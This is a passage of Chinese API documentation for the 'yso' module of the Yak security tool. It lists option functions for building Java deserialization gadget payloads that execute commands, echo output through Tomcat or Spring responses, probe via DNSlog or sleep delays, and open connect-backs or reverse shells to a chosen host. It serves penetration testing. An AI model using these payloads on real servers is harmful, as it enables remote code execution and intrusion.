| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### springEchoBody

#### 详细描述
SetEchoBody

springEchoBody 请求参数选项函数，设置是否要在body中回显。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
``````````````


#### 定义

`springEchoBody() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### springHeader

#### 详细描述
SetHeader

springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。

需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。

参数:

  - key: 要设置的 header 键



参数:

  - val: 要设置的 header 值



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
``````````````


#### 定义

`springHeader(key string, val string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| key | `string` | 要设置的 header 键 |
| val | `string` | 要设置的 header 值 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### springParam

#### 详细描述
SetParam

springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。

参数:

  - val: 要设置的回显值/请求参数



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
``````````````


#### 定义

`springParam(val string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| val | `string` | 要设置的回显值/请求参数 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### springRuntimeExecAction

#### 详细描述
SetExecAction

springRuntimeExecAction 请求参数选项函数，设置是否要执行命令。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
``````````````


#### 定义

`springRuntimeExecAction() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### tcpReverseHost

#### 详细描述
SetTcpReverseHost

tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。

还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。

参数:

  - host: 要设置的 tcpReverseHost 的 host



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
``````````````


#### 定义

`tcpReverseHost(host string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` | 要设置的 tcpReverseHost 的 host |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### tcpReversePort

#### 详细描述
SetTcpReversePort

tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。

还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。

参数:

  - port: 要设置的 tcpReversePort 的 port



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
``````````````


#### 定义

`tcpReversePort(port int) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| port | `int` | 要设置的 tcpReversePort 的 port |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### tcpReverseToken

#### 详细描述
SetTcpReverseToken

tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。

参数:

  - token: 要设置的 token



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
``````````````


#### 定义

`tcpReverseToken(token string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| token | `string` | 要设置的 token |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### threeBytesCharString

#### 详细描述
SetToBytesThreeBytesString 设置序列化时使用三字节字符串



返回值:

  - 用于配置序列化的选项函数




Example:

``````````````yak
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.threeBytesCharString())
``````````````


#### 定义

`threeBytesCharString() MarshalOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `MarshalOptionFun` | 用于配置序列化的选项函数 |


### twoBytesCharString

#### 详细描述
SetToBytesTwoBytesString 设置序列化时使用双字节字符串



返回值:

  - 用于配置序列化的选项函数




Example:

``````````````yak
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.twoBytesCharString())
``````````````


#### 定义

`twoBytesCharString() MarshalOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `MarshalOptionFun` | 用于配置序列化的选项函数 |


### useBase64BytesClass

#### 详细描述
SetClassBase64Bytes

useBase64BytesClass 请求参数选项函数，传入base64编码的字节码。

参数:

  - base64: base64 编码的字节码



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBase64BytesClass(base64Class))
``````````````


#### 定义

`useBase64BytesClass(base64 string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| base64 | `string` | base64 编码的字节码 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useBytesClass

#### 详细描述
SetClassBytes

useBytesClass 请求参数选项函数，传入字节码。

参数:

  - data: 字节码



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
bytesCode,_ =codec.DecodeBase64(bytes)
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))
``````````````


#### 定义

`useBytesClass(data []byte) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| data | `[]byte` | 字节码 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useBytesEvilClass

#### 详细描述
SetBytesEvilClass

useBytesEvilClass 请求参数选项函数，传入自定义的字节码。

参数:

  - data: 自定义的字节码



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
bytesCode,_ =codec.DecodeBase64(bytes)
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))
``````````````


#### 定义

`useBytesEvilClass(data []byte) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| data | `[]byte` | 自定义的字节码 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useClassMultiEchoTemplate

#### 详细描述
SetClassMultiEchoTemplate

useClassMultiEchoTemplate 请求参数选项函数，用于设置生成 MultiEcho 类的模板，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
body 回显
bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
header 回显
headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


#### 定义

`useClassMultiEchoTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useClassParam

#### 详细描述
SetClassParam 设置类生成时的参数

参数:

  - k: 参数名



参数:

  - v: 参数值



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
classObj,_ = yso.GenerateClass(yso.useClassParam("command","whoami"))
``````````````


#### 定义

`useClassParam(k string, v string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| k | `string` | 参数名 |
| v | `string` | 参数值 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useConstructorExecutor

#### 详细描述
SetConstruct

useConstructorExecutor 请求参数选项函数，用于设置是否使用构造器执行。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.useConstructorExecutor())
``````````````


#### 定义

`useConstructorExecutor() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useDNSLogEvilClass

#### 详细描述
SetDnslogEvilClass

useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。

参数:

  - addr: 要设置的 Dnslog 域名



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
``````````````


#### 定义

`useDNSLogEvilClass(addr string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| addr | `string` | 要设置的 Dnslog 域名 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useDNSlogTemplate

#### 详细描述
SetClassDnslogTemplate

useDnslogTemplate 请求参数选项函数，用于设置生成Dnslog类的模板，需要配合 dnslogDomain 使用。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
``````````````


#### 定义

`useDNSlogTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useEchoBody

#### 详细描述
SetEchoBody

springEchoBody 请求参数选项函数，设置是否要在body中回显。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
``````````````


#### 定义

`useEchoBody() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useHeaderEchoEvilClass

#### 详细描述
SetHeaderEchoEvilClass

useHeaderEchoEvilClass 请求参数选项函数，设置 HeaderEcho 类，需要配合 useHeaderParam 使用。

和 useHeaderEchoTemplate 的功能一样



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


#### 定义

`useHeaderEchoEvilClass() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useHeaderEchoTemplate

#### 详细描述
SetClassHeaderEchoTemplate

useHeaderEchoTemplate 请求参数选项函数，用于设置生成HeaderEcho类的模板，需要配合 useHeaderParam 使用。

自动查找Response对象并在header中回显指定内容，需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


#### 定义

`useHeaderEchoTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useHeaderParam

#### 详细描述
SetHeader

springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。

需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。

参数:

  - key: 要设置的 header 键



参数:

  - val: 要设置的 header 值



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
``````````````


#### 定义

`useHeaderParam(key string, val string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| key | `string` | 要设置的 header 键 |
| val | `string` | 要设置的 header 值 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useModifyTomcatMaxHeaderSizeTemplate

#### 详细描述
SetClassModifyTomcatMaxHeaderSizeTemplate

useModifyTomcatMaxHeaderSizeTemplate 请求参数选项函数，用于设置生成ModifyTomcatMaxHeaderSize类的模板。



返回值:

  - 用于配置 Java 对象生成的选项函数



一般用于shiro利用，用于修改 tomcat 的 MaxHeaderSize 值。


Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
``````````````


#### 定义

`useModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useMultiEchoEvilClass

#### 详细描述
SetMultiEchoEvilClass

useMultiEchoEvilClass 请求参数选项函数，设置 MultiEcho 类，主要用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

和 useClassMultiEchoTemplate 的功能一样



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
body 回显
bodyClassObj,_ =  yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
header 回显
headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


#### 定义

`useMultiEchoEvilClass() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useParam

#### 详细描述
SetParam

springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。

参数:

  - val: 要设置的回显值/请求参数



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
``````````````


#### 定义

`useParam(val string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| val | `string` | 要设置的回显值/请求参数 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useProcessBuilderExecEvilClass

#### 详细描述
SetProcessBuilderExecEvilClass

useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。

参数:

  - cmd: 要执行的命令字符串



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
``````````````


#### 定义

`useProcessBuilderExecEvilClass(cmd string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要执行的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useProcessBuilderExecTemplate

#### 详细描述
SetClassProcessBuilderExecTemplate

useProcessBuilderExecTemplate 请求参数选项函数，用于设置生成ProcessBuilderExec类的模板，需要配合 command 使用。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
``````````````


#### 定义

`useProcessBuilderExecTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useProcessImplExecEvilClass

#### 详细描述
SetProcessImplExecEvilClass

useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。

参数:

  - cmd: 要执行的命令字符串



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
``````````````


#### 定义

`useProcessImplExecEvilClass(cmd string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要执行的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useProcessImplExecTemplate

#### 详细描述
SetClassProcessImplExecTemplate

useProcessImplExecTemplate 请求参数选项函数，用于设置生成ProcessImplExec类的模板，需要配合command使用。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
``````````````


#### 定义

`useProcessImplExecTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useRuntimeExecEvilClass

#### 详细描述
SetRuntimeExecEvilClass

useRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。

参数:

  - cmd: 要执行的命令字符串



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
``````````````


#### 定义

`useRuntimeExecEvilClass(cmd string) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` | 要执行的命令字符串 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useRuntimeExecTemplate

#### 详细描述
SetClassRuntimeExecTemplate

useRuntimeExecTemplate 请求参数选项函数，用于设置生成RuntimeExec类的模板，需要配合 command 使用。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command("whoami"))
``````````````


#### 定义

`useRuntimeExecTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useSleepEvilClass

#### 详细描述
SetSleepEvilClass

useSleepEvilClass 请求参数选项函数，设置 Sleep 类，需要配合 useSleepTime 使用。

和 useSleepTemplate 的功能一样



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSleepEvilClass(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
``````````````


#### 定义

`useSleepEvilClass() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useSleepTemplate

#### 详细描述
SetClassSleepTemplate

useSleepTemplate 请求参数选项函数，用于设置生成 Sleep 类的模板，需要配合 useSleepTime 使用，主要用与指定 sleep 时长，用于延时检测gadget。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
``````````````


#### 定义

`useSleepTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useSleepTime

#### 详细描述
SetSleepTime

useSleepTime 请求参数选项函数，设置指定的 sleep 时长，需要配合 useSleepTemplate 使用，主要用与指定 sleep 时长，用于延时检测gadget。

参数:

  - time: sleep 时长，单位秒



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
``````````````


#### 定义

`useSleepTime(time int) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| time | `int` | sleep 时长，单位秒 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useSpringEchoTemplate

#### 详细描述
SetClassSpringEchoTemplate

useSpringEchoTemplate 请求参数选项函数，用于设置生成SpringEcho类的模板，需要配合 springHeader 或 springParam 使用。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
``````````````


#### 定义

`useSpringEchoTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useTcpReverseEvilClass

#### 详细描述
SetTcpReverseEvilClass

useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。

相当于 useTcpReverseTemplate ，tcpReverseHost  两个个函数的组合。

参数:

  - host: 要设置的 tcpReverseHost 的 host



参数:

  - port: 要设置的 tcpReversePort 的 port



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
``````````````


#### 定义

`useTcpReverseEvilClass(host string, port int) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` | 要设置的 tcpReverseHost 的 host |
| port | `int` | 要设置的 tcpReversePort 的 port |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useTcpReverseShellEvilClass

#### 详细描述
SetTcpReverseShellEvilClass

useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。

相当于 useTcpReverseShellTemplate ，tcpReverseShellHost，tcpReverseShellPort  三个个函数的组合。

参数:

  - host: 要设置的 tcpReverseShellHost 的 host



参数:

  - port: 要设置的 tcpReverseShellPort 的 port



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
host = "公网IP"
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
``````````````


#### 定义

`useTcpReverseShellEvilClass(host string, port int) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` | 要设置的 tcpReverseShellHost 的 host |
| port | `int` | 要设置的 tcpReverseShellPort 的 port |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useTcpReverseShellTemplate

#### 详细描述
SetClassTcpReverseShellTemplate

useTcpReverseShellTemplate 请求参数选项函数，用于设置生成TcpReverseShell类的模板，需要配合 tcpReverseShellHost 和 tcpReverseShellPort 使用。

该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
host = "公网IP"
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
``````````````


#### 定义

`useTcpReverseShellTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useTcpReverseTemplate

#### 详细描述
SetClassTcpReverseTemplate

useTcpReverseTemplate 请求参数选项函数，用于设置生成TcpReverse类的模板，需要配合 tcpReverseHost 和 tcpReversePort 使用。

还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
host = "公网IP"
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
``````````````


#### 定义

`useTcpReverseTemplate() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useTemplate

#### 详细描述
SetClassType 设置要生成的类类型

参数:

  - t: 类类型



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
classObj,_ = yso.GenerateClass(yso.useTemplate("RuntimeExec"))
``````````````


#### 定义

`useTemplate(t ClassType) GenClassOptionFun`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| t | `ClassType` | 类类型 |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useTomcatEchoEvilClass

#### 详细描述
SetTomcatEchoEvilClass

useTomcatEchoEvilClass 请求参数选项函数，设置 TomcatEcho 类，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

和 useTomcatEchoTemplate 的功能一样



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
body 回显
bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
header 回显
headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


#### 定义

`useTomcatEchoEvilClass() GenClassOptionFun`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `GenClassOptionFun` | 用于配置 Java 对象生成的选项函数 |


### useTomcatEchoTemplate

#### 详细描述
SetClassTomcatEchoTemplate

useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。



返回值:

  - 用于配置 Java 对象生成的选项函数




Example:

``````````````yak
body 回显
bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
header 回显
headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
``````````````


